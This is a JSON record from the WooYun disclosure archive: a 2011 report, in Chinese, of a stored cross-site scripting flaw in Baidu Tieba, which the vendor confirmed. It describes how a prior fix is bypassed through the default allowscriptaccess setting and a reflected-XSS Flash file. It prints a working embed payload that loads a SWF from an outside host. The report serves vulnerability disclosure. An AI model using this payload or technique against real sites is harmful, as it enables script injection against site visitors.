{"id": 22975, "wybug_id": "wooyun-2011-01757", "wybug_title": "百度i贴吧存储型跨站 Ⅱ", "wybug_corp": "百度", "wybug_author": "p.z", "wybug_date": "2011-03-29 23:06", "wybug_open_date": "2011-04-29 00:00", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["盲目信任用户数据", "第三方合作不可控", "引入第三方动态内容", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-03-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-03-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-04-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-04-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-04-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-04-29：\t细节向公众公开  简要描述： 过滤不当引起跨站 详细说明：  百度对 WooYun: 百度i贴吧存储型跨站 的修复是修改allowscriptaccess为never,但是通过测试发现,如果post帖子时没有allowscriptaccess这一属性,在帖子里也不会出现allowscriptaccess,allowscriptaccess的默认值为samedomain.然后再tieba.baidu.com上找个reflected xss swf:http://tieba.baidu.com/tb/js/tbnet/wuque.swf?debugMode=1&onReady=alert%282%29就可以继续利用 WooYun: 百度i贴吧存储型跨站 的办法进行跨站   漏洞证明：  http://tieba.baidu.com/i/72720605/p/96327461:\n<embed width=\"500\" height=\"450\" class=\"BDE_Flash\" type=\"application/x-shockwave-flash\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" wmode=\"transparent\" play=\"true\" loop=\"false\" menu=\"false\" src=\"http://www.tudou.com/v/2jaoqR1Wirk/&amp;snap_pic=http://secsay.com/tieba.baidu/redirect.php/v.swf\" allowfullscreen=\"true\" scale=\"noborder\">\n   修复方案：     版权声明：转载请注明来源 p.z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2011-03-30 16:15 厂商回复： 感谢提供. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-03-29 23:25 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  Errrrr.......    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}